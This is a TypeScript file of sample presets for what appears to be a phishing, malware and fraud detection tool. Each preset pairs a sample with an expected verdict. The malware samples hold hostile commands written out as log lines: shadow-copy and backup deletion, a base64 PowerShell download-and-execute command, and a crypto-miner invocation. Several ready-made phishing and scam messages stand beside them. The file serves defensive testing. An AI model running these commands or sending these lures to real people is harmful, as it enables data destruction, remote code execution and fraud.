import { SamplePreset } from '../types';

export const SAMPLE_PRESETS: SamplePreset[] = [
  // PHISHING PRESETS
  {
    id: 'PRE_PHISH_01',
    module: 'phishing',
    title: 'Urgent Bank Account Suspension & OTP Request',
    subtitle: 'Classic Phishing Email with High Urgency & Typosquatted Domain',
    expectedVerdict: 'HIGH_RISK',
    description: 'Simulates an urgent email threatening account suspension within 24 hours, directing to a lookalike domain with a shortened URL.',
    content: `From: "SBI Security Alert" <support@sbi-netbanking-sec.com>
To: target_user@example.com
Subject: URGENT: Your Account Has Been Suspended - Action Required Immediately!
Date: Mon, 01 Aug 2026 09:12:00 +0530
Reply-To: security-verify@suspicious-host.xyz

Dear Customer,

We detected an unauthorized login attempt from IP 185.220.101.5. For your protection, your NetBanking account has been temporarily deactivated.

To reactivate your account immediately and avoid permanent suspension within 24 hours, you MUST verify your credentials and confirm your PIN now:

Click here to verify: http://bit.ly/sbi-verify-login or go directly to http://185.220.101.5/sbi/login.php

Failure to enter your password and full CVV will result in immediate account closure.

Sincerely,
SBI Security Operations Team`,
  },
  {
    id: 'PRE_PHISH_02',
    module: 'phishing',
    title: 'Electricity Bill Cutoff Smishing Message',
    subtitle: 'SMS / WhatsApp Smishing with APK Attachment Lure',
    expectedVerdict: 'HIGH_RISK',
    description: 'SMS threat stating power supply will be disconnected tonight unless an APK is installed or bill paid on a fake link.',
    content: `Dear Consumer, Your Electricity power connection will be disconnected tonight at 9:30 PM from power office because your previous month bill was not updated.

Please contact our Electricity Officer immediately at 9876543210 or update bill instantly on http://cutt.ly/power-bill-update or install our update app http://power-board.top/Electricity_Update.apk to avoid power cutoff.

Urgent Action Required!`,
  },
  {
    id: 'PRE_PHISH_03',
    module: 'phishing',
    title: 'Executive Wire Transfer Request (BEC / Whaling)',
    subtitle: 'Targeted Spear Phishing Requesting Confidential Transfer',
    expectedVerdict: 'SUSPICIOUS',
    description: 'Impersonates a CEO emailing the Finance Director demanding a confidential wire transfer for an acquisition.',
    content: `From: "Robert Vance - CEO" <robert.vance@company-exec.net>
To: cfo@company.com
Subject: CONFIDENTIAL: Urgent Vendor Invoice Wire Transfer Request

Hi Team,

I am currently in an urgent board meeting regarding a confidential acquisition.

Please process a wire transfer of $45,000 immediately for the vendor invoice attached. Keep this strictly confidential as it has not been publicly announced yet. 

Please send me the wire confirmation receipt before 3 PM today.

Best regards,
Robert Vance
Chief Executive Officer`,
  },
  {
    id: 'PRE_PHISH_04',
    module: 'phishing',
    title: 'Legitimate System Notification (Clean Sample)',
    subtitle: 'Authentic Security Alert for Verification',
    expectedVerdict: 'SAFE',
    description: 'Standard security digest from a verified domain with personalized salutation and no urgent links.',
    content: `From: "GitHub" <noreply@github.com>
To: developer@mycompany.com
Subject: [GitHub] A new personal access token was generated
Date: Mon, 01 Aug 2026 08:00:00 +0000

Hi Alex,

A new personal access token (Scope: repo, workflow) was generated for your account AlexDev on August 1, 2026.

If you generated this token, no further action is required.
If you did not request this change, please log in to https://github.com/settings/tokens to revoke it immediately.

Thanks,
The GitHub Security Team`,
  },

  // MALWARE PRESETS
  {
    id: 'PRE_MAL_01',
    module: 'malware',
    title: 'WannaCry Ransomware Execution Log',
    subtitle: 'Process Logs with Shadow Copy Deletion & Encryption Note',
    expectedVerdict: 'CRITICAL',
    description: 'Command line logs showing Volume Shadow Copy wipe and dropping of .WNCRY files.',
    content: `[PROCESS_START] PID: 4092 Path: C:\\Users\\Admin\\AppData\\Local\\Temp\\tasksche.exe
[COMMAND_EXEC] cmd.exe /c vssadmin delete shadows /all /quiet
[COMMAND_EXEC] wbadmin delete systemstatebackup -keepVersions:0
[COMMAND_EXEC] bcdedit /set {default} recoveryenabled No
[COMMAND_EXEC] bcdedit /set {default} bootstatusignorepageerrors
[FILE_DROP] C:\\Users\\Admin\\Desktop\\@Please_Read_Me@.txt
[FILE_MODIFY] Encrypted 1,420 files in C:\\Users\\Admin\\Documents. Appended extension .WNCRY
[NETWORK_CALLBACK] Attempting connection to C2 node stratum+tcp://monero.pool.supportxmr.com:5555
[MUTEX_CREATE] Global\\MsWinZonesCacheCounterMutexA`,
  },
  {
    id: 'PRE_MAL_02',
    module: 'malware',
    title: 'Emotet / Banking Trojan PowerShell Injector',
    subtitle: 'Obfuscated Encoded PowerShell Command Log',
    expectedVerdict: 'HIGH_RISK',
    description: 'Base64 encoded powershell script executing web client download and process memory injection.',
    content: `[SUSPICIOUS_SCRIPT] Process: powershell.exe -e aWV4IChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vZHVja2Rucy5vcmcvYmFua19pbmplY3QuZGxsJyk=
[DECODED_TEXT] iex (new-object net.webclient).downloadstring('http://duckdns.org/bank_inject.dll')
[API_CALL] WriteProcessMemory target: svchost.exe (PID 884)
[API_CALL] CreateRemoteThread target: svchost.exe ThreadAddress: 0x7FFA1200
[REGISTRY_MOD] HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateService = C:\\ProgramData\\win_update.exe
[KEYLOGGER_HOOK] SetWindowsHookExA WH_KEYBOARD_LL attached to thread`,
  },
  {
    id: 'PRE_MAL_03',
    module: 'malware',
    title: 'Cryptojacking Miner & High CPU Diagnostic',
    subtitle: 'Hidden Stratum Mining Process Activity',
    expectedVerdict: 'SUSPICIOUS',
    description: 'System diagnostic showing xmrig miner hidden as svchost.exe pushing 99% CPU utilization.',
    content: `[SYSTEM_ALERT] CPU Utilization at 99.4% on 16 Cores.
[PROCESS_LIST] PID: 5122 Name: svchost_miner.exe (Path: C:\\ProgramData\\xmrig.exe)
[ARGUMENTS] --algo rx/0 --url stratum+tcp://pool.supportxmr.com:3333 --user 44AFFq5kSi... --pass x --cpu-max-threads-hint 100
[NETWORK] Outbound persistent socket open to 192.99.42.12:3333 (Monero Mining Pool)
[PERSISTENCE] ScheduledTask created: "SystemGPUHealthCheck" running at startup`,
  },

  // FRAUD PRESETS
  {
    id: 'PRE_FRD_01',
    module: 'fraud',
    title: 'Fake UPI Collect Request & QR Code Refund Scam',
    subtitle: 'Scammer Claiming Money Refund Requires Entering UPI PIN',
    expectedVerdict: 'HIGH_RISK',
    description: 'SMS / Chat exchange where fraudster attempts to deduct money via fake collect request.',
    content: `Scammer: "Hello Sir, I am calling from Paytm Customer Care regarding your pending cashback refund of Rs 4,999. I have sent a UPI Collect Request to your GPay app. Please approve the paytm refund approval request and enter your 6-digit UPI PIN to receive the money into your bank account immediately."

Transaction Note: "Paytm Cash Deposit Approval - Scan QR to receive money"
Collect Amount: Rs 4,999.00
Requested Handle: paytm-refund-desk@ybl`,
  },
  {
    id: 'PRE_FRD_02',
    module: 'fraud',
    title: 'Telegram Crypto Double Investment & Ponzi Scheme',
    subtitle: 'Guaranteed High Yield Return Lure',
    expectedVerdict: 'HIGH_RISK',
    description: 'Promotional message promising to double Bitcoin/USDT deposits within 2 hours.',
    content: `🔥 OFFICIAL BINANCE CRYPTO MULTIPLIER BOT 🔥

Guaranteed 100% daily profit! Send 0.1 BTC and receive 0.2 BTC back within 2 hours guaranteed by automated smart contract!

Send Bitcoin Deposit to address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Or USDT TRC20: T9yD14Nj9j7xAB4dbGeiX9hA2112345

Pay small clearance charge upfront of 0.005 BTC to release instant profit. 100% risk free guaranteed payout! Join VIP Telegram group for proof!`,
  },
  {
    id: 'PRE_FRD_03',
    module: 'fraud',
    title: 'FedEx Customs Parcel "Digital Arrest" Extortion',
    subtitle: 'Impersonation of Narcotics Bureau Officer over Skype',
    expectedVerdict: 'CRITICAL',
    description: 'Threat message claiming illegal contraband seized in recipient package demanding immediate wire transfer.',
    content: `URGENT NOTICE FROM MUMBAI POLICE & NARCOTICS CONTROL BUREAU:

A FedEx parcel tracking #FDX-88291 shipped in your name to Taiwan was intercepted at Mumbai Airport Customs.
Contents Seized: 5 Stolen Passports, 140 grams MDMA Drugs, and 3 Blank Credit Cards.

An FIR under NDPS Act Sec 20 has been registered against your Aadhaar card. You are currently under "Digital Arrest". You must stay online on Skype video call with NCB Officer instantly for verification.

To avoid immediate physical arrest, you must transfer your account balance to the RBI Verification Escrow Account for forensic audit:
Account Name: Gov Audit Clearance
Bank: National Escrow Desk
Account No: 992810110293`,
  },
];
